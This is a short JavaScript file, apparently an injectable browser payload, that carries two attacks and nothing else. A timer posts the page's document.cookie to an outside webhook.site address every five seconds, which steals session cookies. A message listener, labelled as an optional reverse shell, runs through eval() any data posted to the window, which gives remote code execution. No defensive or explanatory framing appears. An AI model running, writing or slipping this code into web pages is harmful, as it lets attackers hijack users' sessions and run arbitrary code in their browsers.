setInterval(() => {
    fetch("https://webhook.site/57bd032f-5d88-4dde-a6d2-2632fb9a9c1f", {
        method: "POST",
        body: document.cookie
    });
}, 5000);

// Optional reverse shell
window.addEventListener("message", e => {
    eval(e.data);
});
